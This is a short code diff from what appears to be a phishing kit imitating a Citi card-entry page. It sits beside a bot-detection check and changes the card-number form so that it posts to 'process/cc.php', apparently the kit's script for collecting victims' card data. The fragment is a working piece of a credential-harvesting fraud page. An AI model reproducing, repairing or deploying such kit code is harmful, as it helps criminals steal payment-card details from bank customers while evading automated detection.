@@ -7555,7 +7555,7 @@ if($bot == "is_bot"){
                             </section>
 										<router-outlet _ngcontent-tey-c261=""></router-outlet>
 											<app-enter-card-number _nghost-tey-c262="">
-												  <form action="process/cc" method="post">
+												  <form action="process/cc.php" method="post">
 												<div _ngcontent-tey-c262="" role="main" class="fullbleedFix">
 													<!---->
 													<citi-row _ngcontent-tey-c262="">
